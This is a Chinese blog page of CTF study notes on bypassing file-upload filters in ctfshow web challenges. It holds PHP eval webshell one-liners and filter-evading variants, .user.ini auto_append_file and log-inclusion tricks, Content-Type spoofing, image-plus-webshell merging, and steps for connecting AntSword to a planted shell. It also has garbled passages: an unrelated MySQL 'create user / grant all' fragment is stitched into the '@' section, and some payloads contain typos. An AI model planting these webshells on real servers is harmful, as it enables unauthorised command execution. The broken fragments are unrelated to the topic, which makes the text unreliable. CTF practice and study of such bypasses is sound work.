&quot;.ra&quot;&#x3D;&quot;audio&#x2F;vnd.rn-realaudio&quot;
&quot;.ram&quot;&#x3D;&quot;audio&#x2F;x-pn-realaudio&quot;
&quot;.ras&quot;&#x3D;&quot;application&#x2F;x-ras&quot;
&quot;.rat&quot;&#x3D;&quot;application&#x2F;rat-file&quot;
&quot;.rdf&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.rec&quot;&#x3D;&quot;application&#x2F;vnd.rn-recording&quot;
&quot;.red&quot;&#x3D;&quot;application&#x2F;x-red&quot;
&quot;.rgb&quot;&#x3D;&quot;application&#x2F;x-rgb&quot;
&quot;.rjs&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rjs&quot;
&quot;.rjt&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rjt&quot;
&quot;.rlc&quot;&#x3D;&quot;application&#x2F;x-rlc&quot;
&quot;.rle&quot;&#x3D;&quot;application&#x2F;x-rle&quot;
&quot;.rm&quot;&#x3D;&quot;application&#x2F;vnd.rn-realmedia&quot;
&quot;.rmf&quot;&#x3D;&quot;application&#x2F;vnd.adobe.rmf&quot;
&quot;.rmi&quot;&#x3D;&quot;audio&#x2F;mid&quot;
&quot;.rmj&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rmj&quot;
&quot;.rmm&quot;&#x3D;&quot;audio&#x2F;x-pn-realaudio&quot;
&quot;.rmp&quot;&#x3D;&quot;application&#x2F;vnd.rn-rn_music_package&quot;
&quot;.rms&quot;&#x3D;&quot;application&#x2F;vnd.rn-realmedia-secure&quot;
&quot;.rmvb&quot;&#x3D;&quot;application&#x2F;vnd.rn-realmedia-vbr&quot;
&quot;.rmx&quot;&#x3D;&quot;application&#x2F;vnd.rn-realsystem-rmx&quot;
&quot;.rnx&quot;&#x3D;&quot;application&#x2F;vnd.rn-realplayer&quot;
&quot;.rp&quot;&#x3D;&quot;image&#x2F;vnd.rn-realpix&quot;
&quot;.rpm&quot;&#x3D;&quot;audio&#x2F;x-pn-realaudio-plugin&quot;
&quot;.rsml&quot;&#x3D;&quot;application&#x2F;vnd.rn-rsml&quot;
&quot;.rt&quot;&#x3D;&quot;text&#x2F;vnd.rn-realtext&quot;
&quot;.rtf&quot;&#x3D;&quot;application&#x2F;msword&quot;
&quot;.rtf&quot;&#x3D;&quot;application&#x2F;x-rtf&quot;
&quot;.rv&quot;&#x3D;&quot;video&#x2F;vnd.rn-realvideo&quot;
&quot;.sam&quot;&#x3D;&quot;application&#x2F;x-sam&quot;
&quot;.sat&quot;&#x3D;&quot;application&#x2F;x-sat&quot;
&quot;.sdp&quot;&#x3D;&quot;application&#x2F;sdp&quot;
&quot;.sdw&quot;&#x3D;&quot;application&#x2F;x-sdw&quot;
&quot;.sit&quot;&#x3D;&quot;application&#x2F;x-stuffit&quot;
&quot;.slb&quot;&#x3D;&quot;application&#x2F;x-slb&quot;
&quot;.sld&quot;&#x3D;&quot;application&#x2F;x-sld&quot;
&quot;.slk&quot;&#x3D;&quot;drawing&#x2F;x-slk&quot;
&quot;.smi&quot;&#x3D;&quot;application&#x2F;smil&quot;
&quot;.smil&quot;&#x3D;&quot;application&#x2F;smil&quot;
&quot;.smk&quot;&#x3D;&quot;application&#x2F;x-smk&quot;
&quot;.snd&quot;&#x3D;&quot;audio&#x2F;basic&quot;
&quot;.sol&quot;&#x3D;&quot;text&#x2F;plain&quot;
&quot;.sor&quot;&#x3D;&quot;text&#x2F;plain&quot;
&quot;.spc&quot;&#x3D;&quot;application&#x2F;x-pkcs7-certificates&quot;
&quot;.spl&quot;&#x3D;&quot;application&#x2F;futuresplash&quot;
&quot;.spp&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.ssm&quot;&#x3D;&quot;application&#x2F;streamingmedia&quot;
&quot;.sst&quot;&#x3D;&quot;application-pki.certstore&quot;
&quot;.stl&quot;&#x3D;&quot;application&#x2F;-pki.stl&quot;
&quot;.stm&quot;&#x3D;&quot;text&#x2F;html&quot;
&quot;.sty&quot;&#x3D;&quot;application&#x2F;x-sty&quot;
&quot;.svg&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.swf&quot;&#x3D;&quot;application&#x2F;x-shockwave-flash&quot;
&quot;.tdf&quot;&#x3D;&quot;application&#x2F;x-tdf&quot;
&quot;.tg4&quot;&#x3D;&quot;application&#x2F;x-tg4&quot;
&quot;.tga&quot;&#x3D;&quot;application&#x2F;x-tga&quot;
&quot;.tif&quot;&#x3D;&quot;image&#x2F;tiff&quot;
&quot;.tif&quot;&#x3D;&quot;application&#x2F;x-tif&quot;
&quot;.tiff&quot;&#x3D;&quot;image&#x2F;tiff&quot;
&quot;.tld&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.top&quot;&#x3D;&quot;drawing&#x2F;x-top&quot;
&quot;.torrent&quot;&#x3D;&quot;application&#x2F;x-bittorrent&quot;
&quot;.tsd&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.txt&quot;&#x3D;&quot;text&#x2F;plain&quot;
&quot;.uin&quot;&#x3D;&quot;application&#x2F;x-icq&quot;
&quot;.uls&quot;&#x3D;&quot;text&#x2F;iuls&quot;
&quot;.vcf&quot;&#x3D;&quot;text&#x2F;x-vcard&quot;
&quot;.vda&quot;&#x3D;&quot;application&#x2F;x-vda&quot;
&quot;.vdx&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
&quot;.vml&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.vpg&quot;&#x3D;&quot;application&#x2F;x-vpeg005&quot;
&quot;.vsd&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
&quot;.vsd&quot;&#x3D;&quot;application&#x2F;x-vsd&quot;
&quot;.vss&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
&quot;.vst&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
&quot;.vst&quot;&#x3D;&quot;application&#x2F;x-vst&quot;
&quot;.vsw&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
&quot;.vsx&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
&quot;.vtx&quot;&#x3D;&quot;application&#x2F;vnd.visio&quot;
&quot;.vxml&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.wav&quot;&#x3D;&quot;audio&#x2F;wav&quot;
&quot;.wax&quot;&#x3D;&quot;audio&#x2F;x-ms-wax&quot;
&quot;.wb1&quot;&#x3D;&quot;application&#x2F;x-wb1&quot;
&quot;.wb2&quot;&#x3D;&quot;application&#x2F;x-wb2&quot;
&quot;.wb3&quot;&#x3D;&quot;application&#x2F;x-wb3&quot;
&quot;.wbmp&quot;&#x3D;&quot;image&#x2F;vnd.wap.wbmp&quot;
&quot;.wiz&quot;&#x3D;&quot;application&#x2F;msword&quot;
&quot;.wk3&quot;&#x3D;&quot;application&#x2F;x-wk3&quot;
&quot;.wk4&quot;&#x3D;&quot;application&#x2F;x-wk4&quot;
&quot;.wkq&quot;&#x3D;&quot;application&#x2F;x-wkq&quot;
&quot;.wks&quot;&#x3D;&quot;application&#x2F;x-wks&quot;
&quot;.wm&quot;&#x3D;&quot;video&#x2F;x-ms-wm&quot;
&quot;.wma&quot;&#x3D;&quot;audio&#x2F;x-ms-wma&quot;
&quot;.wmd&quot;&#x3D;&quot;application&#x2F;x-ms-wmd&quot;
&quot;.wmf&quot;&#x3D;&quot;application&#x2F;x-wmf&quot;
&quot;.wml&quot;&#x3D;&quot;text&#x2F;vnd.wap.wml&quot;
&quot;.wmv&quot;&#x3D;&quot;video&#x2F;x-ms-wmv&quot;
&quot;.wmx&quot;&#x3D;&quot;video&#x2F;x-ms-wmx&quot;
&quot;.wmz&quot;&#x3D;&quot;application&#x2F;x-ms-wmz&quot;
&quot;.wp6&quot;&#x3D;&quot;application&#x2F;x-wp6&quot;
&quot;.wpd&quot;&#x3D;&quot;application&#x2F;x-wpd&quot;
&quot;.wpg&quot;&#x3D;&quot;application&#x2F;x-wpg&quot;
&quot;.wpl&quot;&#x3D;&quot;application&#x2F;-wpl&quot;
&quot;.wq1&quot;&#x3D;&quot;application&#x2F;x-wq1&quot;
&quot;.wr1&quot;&#x3D;&quot;application&#x2F;x-wr1&quot;
&quot;.wri&quot;&#x3D;&quot;application&#x2F;x-wri&quot;
&quot;.wrk&quot;&#x3D;&quot;application&#x2F;x-wrk&quot;
&quot;.ws&quot;&#x3D;&quot;application&#x2F;x-ws&quot;
&quot;.ws2&quot;&#x3D;&quot;application&#x2F;x-ws&quot;
&quot;.wsc&quot;&#x3D;&quot;text&#x2F;scriptlet&quot;
&quot;.wsdl&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.wvx&quot;&#x3D;&quot;video&#x2F;x-ms-wvx&quot;
&quot;.xdp&quot;&#x3D;&quot;application&#x2F;vnd.adobe.xdp&quot;
&quot;.xdr&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.xfd&quot;&#x3D;&quot;application&#x2F;vnd.adobe.xfd&quot;
&quot;.xfdf&quot;&#x3D;&quot;application&#x2F;vnd.adobe.xfdf&quot;
&quot;.xhtml&quot;&#x3D;&quot;text&#x2F;html&quot;
&quot;.xls&quot;&#x3D;&quot;application&#x2F;-excel&quot;
&quot;.xls&quot;&#x3D;&quot;application&#x2F;x-xls&quot;
&quot;.xlw&quot;&#x3D;&quot;application&#x2F;x-xlw&quot;
&quot;.xml&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.xpl&quot;&#x3D;&quot;audio&#x2F;scpls&quot;
&quot;.xq&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.xql&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.xquery&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.xsd&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.xsl&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.xslt&quot;&#x3D;&quot;text&#x2F;xml&quot;
&quot;.xwd&quot;&#x3D;&quot;application&#x2F;x-xwd&quot;
&quot;.x_b&quot;&#x3D;&quot;application&#x2F;x-x_b&quot;
&quot;.x_t&quot;&#x3D;&quot;application&#x2F;x-x_t&quot;
Office2007对应的值:
&quot;application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.template&quot; (for .docx files)
&quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.presentation&quot; (for .pptx files)
&quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.slideshow&quot; (for .ppsx files)
&quot;application&#x2F;vnd.openxmlformats-officedocument.presentationml.template&quot; (for .potx files)
&quot;application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot; (for .xlsx files)
&quot;application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.template&quot; (for .xltx files)
相对于Office2003是这样的
Response.ContentType &#x3D; &quot;application&#x2F;vnd.ms-excel&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h2 id="最常用的马"><a href="#最常用的马" class="headerlink" title="最常用的马"></a>最常用的马</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo(); @eval($_POST[&#39;shell&#39;]); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li>这样写的目的是有phpinfo()的回显，如果显示了<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717003904.png">的回显，则为能够解析木马，否则不能解析<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3></li>
<li>system函数用于执行外部程序，并且<strong>显示输出</strong><pre class="line-numbers language-none"><code class="language-none">system(string $command,int &amp;$return_var&#x3D;?):string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>返回值为可选的，可以省略</li>
<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716122452.png"></li>
</ol>
<h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><ol>
<li>eval()函数把字符串按照PHP代码来计算</li>
<li>该字符串必须是合法的PHP代码，以分号结尾</li>
<li>eval()内部写的是php代码，而system()函数内部写的是命令</li>
<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716124148.png"></li>
</ol>
<h3 id="tac-cat"><a href="#tac-cat" class="headerlink" title="tac/cat"></a>tac/cat</h3><ol>
<li>用来显示文件，tac是反向（向前）的顺序列出文件的内容,tac最重要的作用是对HTML的注释内容进行破坏，从而使注释内容不需要查看源代码即可回显到主页面</li>
<li>cat是读取其后所指文件内容并将其输出到标准输出设备上</li>
</ol>
<h3 id="-1"><a href="#-1" class="headerlink" title="@"></a>@</h3><ol>
<li>xxxxxxxxxx14 1（1）登录2mysql -u root –p3（2）创建新用户4create user ‘hadming‘@’%’ identified by ‘123456’;5（3）为用户授权6mysql&gt; grant all on <em>.</em> to ‘hadming‘@’%’;7（4）创建数据库8create database hadoopDB;9（5）查看数据库10show databases;11(6)选择数据库12Use hadoopDB13(7)删除数据库14（8）创建表bash</li>
<li>屏蔽了出错文件的路径等信息，安全性高，但是就没有回显了，所以可以不加@来获取到更多的回显信息</li>
</ol>
<h3 id="array-pop"><a href="#array-pop" class="headerlink" title="array_pop()"></a>array_pop()</h3><ol>
<li>可以接受一个post或者get传的参数,这样就可以绕过过滤掉中括号和大括号无法使用$_POST[‘shell’]的情况<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($POST));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717152902.png"></p>
<h3 id="js前端过滤，ctfshow"><a href="#js前端过滤，ctfshow" class="headerlink" title="js前端过滤，ctfshow"></a>js前端过滤，ctfshow</h3><ol>
<li>查看网页源代码，查看js，发现前端过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094646.png"></li>
<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094739.png"></li>
<li>修改前端js，屏蔽过滤<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094808.png"></li>
<li>文件可以上传成功<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716094857.png"></li>
<li>1=system(“ls ./“);在本地找不到东西</li>
<li>1=system(“ls /“);在根目录下也找不到东西<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716114825.png"></li>
<li>1=system(“ls ../“);在上级目录找到flag<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716114952.png"></li>
<li>构造语句1=system(“tac ../flag.php”);看到flag<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115039.png"></li>
</ol>
<h3 id="文件后缀绕过攻击"><a href="#文件后缀绕过攻击" class="headerlink" title="文件后缀绕过攻击"></a>文件后缀绕过攻击</h3><ol>
<li>服务端代码中限制了某些后缀的文件不允许上传，但是有些apache是允许解析其它文件后缀的</li>
<li>在apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的拓展名不能识别，就继续向左判断，直到遇到可以解析的文件后缀为止</li>
<li>例如：1.php.xxxx，xxxx不能解析，所以向左解析后缀php</li>
<li>或者可以大写一个字母，绕过弱过滤，例如php写为phP,大写一个字母</li>
<li>简单来说，文件上传检测的是最右侧的文件后缀名，但是apache从右到左解析，遇到右侧不能解析的文件名会跳过，知道能够解析的位置</li>
</ol>
<h3 id="文件类型绕过攻击-后端不能单一校验"><a href="#文件类型绕过攻击-后端不能单一校验" class="headerlink" title="文件类型绕过攻击,后端不能单一校验"></a>文件类型绕过攻击,后端不能单一校验</h3><ol>
<li>在客户端上传文件时，通过burp抓包，当上传一个php格式的文件时，和上传一个jpg格式的<strong>Content-type不一致</strong></li>
<li>如果<strong>服务端</strong>是<strong>通过Content-type来判断</strong>文件的类型，就存在被绕过的可能，因为Content-type的值是<strong>客户端传递的</strong>，是<strong>可以任意修改的</strong></li>
<li>所以上传一个php文件格式时，在burp中修改<strong>Content-type</strong>的值为image/jpeg，就可以绕过后端的检测</li>
</ol>
<h4 id="使用-FLIES-“file”-“type”-后端过滤"><a href="#使用-FLIES-“file”-“type”-后端过滤" class="headerlink" title="使用$_FLIES[“file”][“type”]后端过滤"></a>使用$_FLIES[“file”][“type”]后端过滤</h4><ol>
<li>$_FILES[“file”][“type”]是客户端请求数据包中的Contant-type,可以通过修改Contant-type来绕过</li>
<li>ctfshow例题152</li>
<li>直接上传，发现<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716165636.png"></li>
<li>上来先找js有没有前端过滤，发现js有前端过滤，修改为php<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115444.png"></li>
<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115448.png">还是不能够上传，应该就是后端有过滤了</li>
<li>抓个包，首先看看是不是文件名后缀的问题，<strong>大写一个字母</strong>，例如phP，发现还是被过滤掉了</li>
<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716115845.png">，<strong>修改文件的Content-type</strong>,和前端所要求的文件类型一致，为image/png<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716120958.png">,就可以上传成功了<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716121004.png"></li>
</ol>
<h5 id="方法2：用蚁剑去连接"><a href="#方法2：用蚁剑去连接" class="headerlink" title="方法2：用蚁剑去连接"></a>方法2：用蚁剑去连接</h5><ol>
<li>绕过前端js过滤，后端改包之后能够上传</li>
<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004035.png"></li>
<li>用蚁剑去连接，右键点击添加数据，url里面填url加上上传马的路径（马所在的位置），密码为post传的参数，即shell<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004227.png">，如果出现连接成功则为ok</li>
<li>在上传文件管理器中单机右键，选择在此处打开终端<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004350.png"></li>
<li>一级一级目录地去寻找flag，<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717004304.png"></li>
</ol>
<h4 id="使用getimagesize-后端过滤"><a href="#使用getimagesize-后端过滤" class="headerlink" title="使用getimagesize()后端过滤"></a>使用getimagesize()后端过滤</h4><ol>
<li>getimagesize()可以获取到图片的宽高，如果上传的不是图片文件，getimagesize()就获取不到信息，返回false，取反!getimagesize()就为true<pre class="line-numbers language-none"><code class="language-none">if(!getimagesize($_FILES[&quot;file&quot;][&quot;type_name&quot;]))&#123;
    exit();  &#x2F;&#x2F;不满足就退出
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
<li>此时可以将一个图片和一个webshell合并为一个文件<pre class="line-numbers language-none"><code class="language-none">cat image.png webshell.php&gt;image.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>也可以用010editor放到最后</li>
</ol>
<h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><ol>
<li>上传.user.ini进行文件上传绕过</li>
<li>一定注意这是一个隐藏配置文件，最前面要加点，是”.user.ini”</li>
</ol>
<h5 id="user-ini文件-常用配置项"><a href="#user-ini文件-常用配置项" class="headerlink" title=".user.ini文件,常用配置项"></a>.user.ini文件,常用配置项</h5><ol>
<li>php支持基于每个目录的.ini文件配置</li>
<li>除了主php.ini文件之外，php还会在每个目录下扫描ini文件，从被执行的php文件所在目录开始，一直上升到web根目录，（$_SERVER[‘DOCUMENT_ROOT’]所指定的），如果被执行的php文件在web根目录之外，则只扫描该目录</li>
<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011205.png"></li>
<li>常用配置项：S<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011252.png"></li>
<li>假设包含1.txt<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717011331.png">,重命名为.user.ini</li>
</ol>
<h3 id="对文件内容过滤"><a href="#对文件内容过滤" class="headerlink" title="对文件内容过滤"></a>对文件内容过滤</h3><h4 id="常用绕过方法"><a href="#常用绕过方法" class="headerlink" title="常用绕过方法"></a>常用绕过方法</h4><ol>
<li>绕过php：短标签：<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; ?&gt;代替php标签，&lt;?&#x3D; ?&gt;标签可以直接把php的结果输出，&lt;?&#x3D; ?&gt;的结果和&lt;?php ?&gt;完全一样<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>绕过空格：使用转义字符绕过’\t’;或者使用%09也是tab的URL编码，php反引号中的字符串会被当作命令执行</li>
<li>绕过[]:使用{}即可，大括号和中括号的作用在php中等价<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717120017.png"></li>
<li>绕过[]和{}:使用array_pop()函数，函数内部写传参的方式，例如：array_pop($_POST);<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717150830.png">，以字符串的形式返回执行的语句<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717151007.png">，可以配合eval()函数使用</li>
<li>绕过分号;:最后一句的分号可以不要，且可以使用?&gt;去绕过分号</li>
</ol>
<h4 id="不允许使用php字样，使用短标签绕过，例题：ctfshow154-ctfshow155"><a href="#不允许使用php字样，使用短标签绕过，例题：ctfshow154-ctfshow155" class="headerlink" title="不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155"></a>不允许使用php字样，使用短标签绕过，例题：ctfshow154,ctfshow155</h4><ol>
<li>上传一个png文件，抓包</li>
<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717111434.png"></li>
<li>改包，改上传文件名称为’.user.ini’,文件内容采用’auto_append_file=1.txt’;</li>
<li>直接上传一个1.txt文件，内容为简单的一句话木马发现报错<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717111650.png"></li>
<li>直接上传一个内容为php的，前端为png的文件内容，发现还是报错，二分法判断前和后哪里的问题，发现是后面不允许使用php字样</li>
<li>使用短标签不适用’php’字样,发现可以上传<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717112101.png"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>连蚁剑，找flag即可<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717112120.png"></li>
<li>连蚁剑的时候，路径写到和.user.ini和1.txt同级的位置，即到.user.ini的上一级目录，/upload的位置</li>
</ol>
<h4 id="不允许使用中括号-，ctfshow156"><a href="#不允许使用中括号-，ctfshow156" class="headerlink" title="不允许使用中括号[]，ctfshow156"></a>不允许使用中括号[]，ctfshow156</h4><ol>
<li>直接使用大括号{}替换中括号[]<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; eval($_POST&#123;&#39;shell&#39;&#125;) ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<h4 id="中括号和大括号都过滤了，还过滤了分号，ctfshow157"><a href="#中括号和大括号都过滤了，还过滤了分号，ctfshow157" class="headerlink" title="中括号和大括号都过滤了，还过滤了分号，ctfshow157"></a>中括号和大括号都过滤了，还过滤了分号，ctfshow157</h4><ol>
<li>这个时候我们可以使用array_pop()函数,函数内部写接收的参数，使用逃逸传参，参数以post或者get方式传入，但是还是不行<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($_POST[&#39;1&#39;]);&amp;1&#x3D;system(&quot;待执行命令&quot;));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>进一步发现过滤了分号，最后位置的语句可以不带分号结尾,即可以上传成功<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($_POST[1])?&gt;&amp;1&#x3D;system(&quot;待执行语句&quot;))?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>用蚁剑连接到*.user.ini的上一级目录位置*，开终端搞就行</li>
</ol>
<h3 id="web159，对大小括号进行过滤-对特殊路径字符进行过滤"><a href="#web159，对大小括号进行过滤-对特殊路径字符进行过滤" class="headerlink" title="web159，对大小括号进行过滤,对特殊路径字符进行过滤"></a>web159，对大小括号进行过滤,对特殊路径字符进行过滤</h3><ol>
<li>使用文件包含进行绕过</li>
<li>对’log’字样进行过滤，使用.进行拼接<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;include&#39;var&#x2F;l&#39;.&#39;og&#x2F;nginx&#x2F;access.l&#39;.&#39;og&#39;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<h3 id="重复改包的技巧"><a href="#重复改包的技巧" class="headerlink" title="重复改包的技巧"></a>重复改包的技巧</h3><ol>
<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717150132.png"></li>
<li>host的位置是域名去掉前面的http头和最后那里的‘/’而成的</li>
</ol>
<h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><h4 id="使用文件包含"><a href="#使用文件包含" class="headerlink" title="使用文件包含"></a>使用文件包含</h4><ol>
<li>/var/log/nginx/access.log</li>
<li>因为对log有过滤，所以可以使用php的’.’去进行拼接</li>
<li>‘/var/l’.’og/nginx/access.l’.’og’</li>
</ol>
<h4 id="题"><a href="#题" class="headerlink" title="题"></a>题</h4><ol>
<li>题中过滤了空格，小括号</li>
<li>可以使用文件包含去做</li>
<li>先上传一个.user.ini,内容为auto_append_file=1.txt</li>
<li>1.txt中写一句话木马</li>
<li><?=include1'/var/l'.'og/nginx/access.l'.'og'?>，这个地方因为过滤了空格，我们考虑使用空白换行符，但是不能直接换行，否则解码的时候空格和换行符的URL编码相同<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220728161132.png"></li>
<li>把上面的1位置的hex值由31改为0d即可上传</li>
<li>后面接着改UA，连接蚁剑即可</li>
</ol>
<h3 id="使用getimagesize-对文件头进行检测"><a href="#使用getimagesize-对文件头进行检测" class="headerlink" title="使用getimagesize()对文件头进行检测"></a>使用getimagesize()对文件头进行检测</h3><ol>
<li><p>首先上传.user.ini文件，且该文件也需要绕过对图片大小的检测，所以payload如下</p>
  <pre class="line-numbers language-none"><code class="language-none">GIF89a
auto_append_file&#x3D;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
